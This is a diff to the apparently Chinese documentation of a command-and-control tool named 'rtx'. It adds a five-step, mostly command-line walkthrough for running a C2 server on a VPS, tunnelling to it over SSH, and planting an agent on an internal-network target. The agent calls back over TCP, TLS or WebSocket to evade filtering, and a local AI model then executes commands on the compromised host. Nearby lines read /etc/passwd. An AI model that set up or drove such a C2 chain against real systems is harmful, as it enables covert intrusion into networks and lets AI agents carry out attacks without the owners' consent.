@@ -82,6 +82,38 @@ rtxctl read -path /etc/passwd
 rtxctl upload -path /tmp/x -file ./本地
 ```
 
+## 实战链路：本地模型 + 内网目标 + VPS 中转（最常见用法）
+
+AI/大模型跑在本地（密钥、推理在本地），目标在内网（只有部署的 agent 够得到），用一台公网 VPS 做中转控制。**模型推理与控制是两条独立流**：推理流本地直连公网模型 API；控制流经 VPS 中转（VPS 只跑 server，不跑模型、不存密钥）。
+
+```
+本地 AI ──模型API──▶ 公网（推理，不经 VPS）
+本地 AI ─SSH隧道─▶ VPS server ─▶ 内网 agent ─▶ 目标执行（控制，经 VPS）
+```
+
+### 搭建（5 步）
+
+```bash
+# 1) VPS 起 server（C2 中转）— 云安全组放行 9000
+TOKEN=$(openssl rand -hex 16)
+./server-linux-amd64 -l :9000 -t "$TOKEN" --ctrl 127.0.0.1:9001   # 加 -tls 加密、-wsl :9080 开 WS
+# 2) 本地接控制面
+ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
+# 3) 本地配置
+rtxctl init --ctrl http://127.0.0.1:9001 --token "$TOKEN"
+# 4) 内网目标部署 agent（单文件，架构对应产物）
+./agent -c <vps>:9000 -t "$TOKEN" -i <名> -tls -pin <server打印fp> -q
+# 5) 本地操作（AI 经 rtx_* 工具/rtxctl 控制内网机）
+rtxctl ls && rtxctl exec -cmd "whoami"
+```
+
+内网 agent 反连方式按出网环境自选：**TCP**（默认）/ **TLS**（`-tls -pin`）/ **ws|wss**（HTTP 白名单/DPI，`-c ws://`）；多层内网用 Stowaway 递送端口，agent 拨最近一跳。Windows agent 内嵌 busybox（Unix 语法）。
+
+### 排障要点
+- `rtxctl ls` 空 → 查本地隧道、VPS server、token
+- agent 不上线 → 查内网到 VPS 出网、token、TLS pin
+- 模型不工作 → 与 rtx 无关，查本地到模型 API（链路独立）
+
 ## 远程可达性场景
 
 - 本机访问不到目标、上线 agent 可达 → 把 agent 部署到可达机器，AI 全部操作穿透到该机器
